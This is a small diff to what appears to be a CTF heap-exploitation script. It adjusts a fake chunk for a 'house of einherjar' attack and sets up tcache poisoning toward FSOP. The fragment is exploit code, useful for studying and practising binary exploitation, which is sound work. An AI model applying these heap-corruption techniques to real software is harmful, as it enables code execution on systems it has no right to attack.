@@ -119,8 +119,8 @@ i = order_book(b'/i')
 j = order_book(b'/j')
 k = order_book(b'/k')
 l = order_book(b'/l')
-# prepare fake chunk of size 0x271 at heap_base_addr+0xae0 for house of einherjar in chunk at heap_base_addr+0xad0
-review_book_add(f, 0x38, b'F'*8+p64(0x271)+p64(heap_base_addr+0xad0)+p64(heap_base_addr+0xad0))
+# prepare fake chunk of size 0x270 at heap_base_addr+0xae0 for house of einherjar in chunk at heap_base_addr+0xad0
+review_book_add(f, 0x38, b'F'*8+p64(0x270)+p64(heap_base_addr+0xad0)*2)
 # prepare two chunks of size 0x100 for tcache poisoning to trigger FSOP later
 review_book_add(g, 0xf8, b'G')
 review_book_add(h, 0xf8, b'H')
